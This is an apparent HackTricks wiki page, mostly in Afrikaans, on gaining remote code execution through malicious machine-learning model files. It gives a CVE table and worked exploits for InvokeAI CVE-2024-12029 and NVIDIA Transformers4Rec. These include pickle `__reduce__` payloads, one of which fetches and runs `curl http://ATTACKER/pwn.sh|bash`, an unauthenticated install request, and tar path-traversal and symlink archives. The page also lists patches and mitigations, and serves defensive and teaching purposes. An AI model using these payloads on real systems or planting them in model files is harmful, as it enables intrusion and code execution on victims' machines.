# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Masjienleer-modelle word gewoonlik gedeel in verskillende formate, soos ONNX, TensorFlow, PyTorch, ens. Hierdie modelle kan in ontwikkelaars se masjiene of produksiestelsels gelaai word om hulle te gebruik. Gewoonlik behoort die modelle geen kwaadwillige kode te bevat nie, maar daar is gevalle waar die model gebruik kan word om arbitrêre kode op die stelsel uit te voer as 'n bedoelde funksie of weens 'n kwesbaarheid in die model-laaibiblioteek.

Op die tyd van skrywe is dit sommige voorbeelde van hierdie tipe kwesbaarhede:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Onveilige deserialisering in* `torch.load` **(CVE-2025-32434)**                                                              | Kwaadaardige pickle in model checkpoint lei tot kode-uitvoering (omseil `weights_only` beskerming)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kwaadaardige model aflaai veroorsaak kode-uitvoering; Java deserialisering RCE in management API                                 | |
| **NVIDIA Merlin Transformers4Rec** | Onveilige checkpoint deserialisering via `torch.load` **(CVE-2025-23298)**                                           | Onbetroubare checkpoint aktiveer pickle-reducer tydens `load_model_trainer_states_from_checkpoint` → kode-uitvoering in ML-werker         | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Laai van model vanaf YAML gebruik `yaml.unsafe_load` (kode-uitvoering) <br> Laai van model met **Lambda** layer voer arbitrêre Python-kode uit | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Gemanipuleerde `.tflite` model veroorsaak heelgetal-oorloop → heap-korrupsie (potensiële RCE)                                            | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Laai van model via `joblib.load` voer pickle uit met aanvaller se `__reduce__` payload                                                  | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *betwis*                                                                                | `numpy.load` standaard laat gepicklede objekreekse toe – kwaadaardige `.npy/.npz` veroorsaak kode-uitvoering                             | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model se external-weights-pad kan gids verlaat (lees arbitrêre lêers) <br> Kwaadaardige ONNX model tar kan ewekansige lêers oorskryf (leidend tot RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model met custom operator vereis laai van aanvaller se native code; komplekse modelgrafieke misbruik logika om onbedoelde berekeninge uit te voer   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Gebruik van model-load API met `--model-control` aangeskakel laat relatiewe padtraversering toe om lêers te skryf (bv. oorskryf `.bashrc` vir RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Verkeerd gevormde GGUF model-lêer veroorsaak heap buffer-oorloop in parser, wat arbitrêre kode-uitvoering op slagofferstelsel moontlik maak                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Kwaadaardige HDF5 (`.h5`) model met Lambda layer-kode word steeds uitgevoer by laai (Keras safe_mode dek nie ou formaat nie – “downgrade attack”) | |
| **Others** (general)        | *Ontwerpfout* – Pickle serialization                                                                                         | Baie ML-instrumente (bv. pickle-gebaseerde modelformate, Python `pickle.load`) sal arbitrêre kode uitvoer wat in model-lêers ingesluit is tensy dit gemitigeer word | |

Verder is daar sommige Python-pickle-gebaseerde models soos dié wat deur [PyTorch](https://github.com/pytorch/pytorch/security) gebruik word wat gebruik kan word om arbitrêre kode op die stelsel uit te voer as hulle nie met `weights_only=True` gelaai word nie. Dus kan enige pickle-gebaseerde model besonder vatbaar wees vir hierdie tipe aanvalle, selfs al word hulle nie in die tabel hierbo gelys nie.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is 'n populêre open-source web-koppelvlak vir Stable-Diffusion. Weergawes **5.3.1 – 5.4.2** stel die REST-endpoint `/api/v2/models/install` bloot wat gebruikers toelaat om modelle vanaf ewekansige URLs af te laai en in te laai.

Intern roep die endpoint uiteindelik aan:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wanneer die verskafte lêer 'n **PyTorch checkpoint (`*.ckpt`)** is, voer `torch.load` 'n **pickle deserialization** uit. Omdat die inhoud direk vanaf 'n deur die gebruiker beheerde URL kom, kan 'n aanvaller 'n kwaadwillige objek met 'n pasgemaakte `__reduce__`-metode in die checkpoint insluit; die metode word uitgevoer **during deserialization**, wat lei tot **remote code execution (RCE)** op die InvokeAI-bediener.

Aan die kwesbaarheid is **CVE-2024-12029** toegewys (CVSS 9.8, EPSS 61.17 %).

#### Uitbuitingsstappe

1. Skep 'n kwaadwillige checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Huisves `payload.ckpt` op 'n HTTP-server wat jy beheer (bv. `http://ATTACKER/payload.ckpt`).
3. Roep die kwesbare endpoint aan (geen verifikasie vereis):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wanneer InvokeAI die lêer aflaai roep dit `torch.load()` → die `os.system` gadget hardloop en die aanvaller verkry kode-uitvoering in die konteks van die InvokeAI-proses.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiseer die hele proses.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan-vlag standaard **false**)  
•  `/api/v2/models/install` bereikbaar deur die aanvaller  
•  Proses het toestemming om shell-opdragte uit te voer

#### Mitigations

* Opgradeer na **InvokeAI ≥ 5.4.3** – die patch stel `scan=True` as standaard en voer malware-skandering uit voor deserialisering.
* Wanneer jy checkpoints programmaties laai, gebruik `torch.load(file, weights_only=True)` of die nuwe [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Handhaaf allow-lists / signatures vir modelbronne en voer die diens uit met minimale regte.

> ⚠️ Onthou dat **elke** Python pickle-gebaseerde formaat (insluitend baie `.pt`, `.pkl`, `.ckpt`, `.pth` lêers) van nature onveilig is om vanaf onbetroubare bronne te deserialiseer.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE deur onveilige `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (deel van Merlin) het 'n onveilige checkpoint loader blootgestel wat direk `torch.load()` op deur die gebruiker voorsiene paaie aangeroep het. Omdat `torch.load` op Python `pickle` staatmaak, kan 'n deur 'n aanvaller beheerde checkpoint arbitrêre kode uitvoer via 'n reducer tydens deserialisering.

Kwetsbare pad (voor fiksing): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Waarom dit tot RCE lei: In Python `pickle` kan 'n object 'n reducer (`__reduce__`/`__setstate__`) definieer wat 'n callable en argumente teruggee. Die callable word tydens unpickling uitgevoer. As so 'n object in 'n checkpoint teenwoordig is, word dit uitgevoer voordat enige gewigte gebruik word.

Minimale kwaadwillige checkpoint-voorbeeld:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Afleweringsvektore en skadekring:
- Trojanized checkpoints/models gedeel via repos, buckets, or artifact registries
- Geautomatiseerde resume/deploy pipelines wat checkpoints outomaties laai
- Uitvoering gebeur binne training/inference workers, dikwels met verhoogde voorregte (bv., root in containers)

Oplossing: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) het die direkte `torch.load()` vervang deur 'n beperkte, toegelate deserializer geïmplementeer in `transformers4rec/utils/serialization.py`. Die nuwe loader valideer tipes/velde en voorkom dat arbitrêre callables tydens laai aangeroep word.

Verdedigingsriglyne spesifiek vir PyTorch checkpoints:
- Moet nie unpickle onbetroubare data nie. Verkies nie-uitvoerbare formate soos [Safetensors](https://huggingface.co/docs/safetensors/index) of ONNX waar moontlik.
- As jy PyTorch serialization moet gebruik, verseker `weights_only=True` (ondersteun in nuwer PyTorch) of gebruik 'n pasgemaakte toegelate unpickler soortgelyk aan die Transformers4Rec-patch.
- Dwing model provenansie/handtekeninge af en gebruik sandbox-deserialisering (seccomp/AppArmor; non-root user; beperkte FS en geen uitgaande netwerkverkeer).
- Moniteer vir onverwagte child processes van ML-dienste tydens checkpoint-laaityd; spoor `torch.load()`/`pickle` gebruik.

POC en kwesbare/patch verwysings:
- Kwesbare pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Kwaadaardige checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Na-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Voorbeeld – skep 'n kwaadwillige PyTorch-model

- Skep die model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Laai die model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelle vir Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Daarom kan dit moontlik wees om hierdie formate te misbruik om path traversal attacks uit te voer, wat toelaat om arbitrêre lêers van die stelsel waar die model gelaai word te lees.

Byvoorbeeld, met die volgende kode kan jy 'n model skep wat 'n lêer in die `/tmp` directory sal aanmaak wanneer dit gelaai word:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Of, met die volgende kode kan jy 'n model skep wat 'n symlink na die `/tmp`-gids sal skep wanneer dit gelaai word:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Diepduik: Keras .keras deserialisering en gadget hunting

Vir 'n gefokusde gids oor .keras internals, Lambda-layer RCE, die arbitrary import-kwessie in ≤ 3.8, en post-fix gadget discovery binne die allowlist, sien:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Verwysings

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
